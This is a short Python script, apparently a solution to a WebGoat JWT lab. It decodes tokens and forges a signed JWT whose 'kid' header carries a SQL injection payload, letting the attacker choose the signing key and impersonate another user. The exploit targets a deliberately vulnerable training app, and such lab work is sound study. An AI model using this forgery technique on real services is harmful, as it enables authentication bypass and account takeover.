# _*_ coding: utf-8 _*_
#hack jwt
import jwt
import base64

def decode_jwt(Jwt):
    Jwt = Jwt.split('.')
    header = Jwt[0]
    claims = Jwt[1]
    signature = Jwt[2]
    # 补齐=号,base64编码必须为4的倍数
    padding_header = 4 - len(header) % 4
    padding_claims = 4 - len(claims) % 4
    header_decoded = base64.b64decode(header + '=' * padding_header)
    claims_docoded = base64.b64decode(claims + '=' * padding_claims)
    print 'header: ' + header_decoded
    print 'claims: ' + claims_docoded
    
def generate_jwt(payload, secret_key, algorithm, header = None):
    Jwt = jwt.encode(payload, secret_key, algorithm = algorithm, headers = header)
    print Jwt

def brute_force_secret_key(Jwt):
    pass

if __name__ == '__main__':
    #Jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IndlYmdvYXRfa2V5JyBhbmQgJzEnPScyJyB1bmlvbiBzZWxlY3QgaWQgRlJPTSBqd3Rfa2V5cyBXSEVSRSBpZD0nd2ViZ29hdF9rZXkifQ.eyJ1c2VybmFtZSI6IlRvbSIsIlJvbGUiOlsiQ2F0Il0sImF1ZCI6IndlYmdvYXQub3JnIiwiZXhwIjoxNjE4OTA1MzA0LCJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1Mjk1Njk1MzYsIkVtYWlsIjoiamVycnlAd2ViZ29hdC5jb20iLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSJ9.aekwmdNMnSUoiZGJGiY3Epsm30sjcCc2Z66T7RuoXhI'
    #decode_jwt(Jwt)
    
    header = {"typ":"JWT","kid":"webgoat_key1' and '1'='2' union select id from jwt_keys where id='webgoat_key' --","alg":"HS256"}
    payload = {"iat":1529569536,"iss":"WebGoat Token Builder","exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}
    algorithm = 'HS256'
    secret_key = 'webgoat_key'
    generate_jwt(payload, secret_key, algorithm, header)
   
    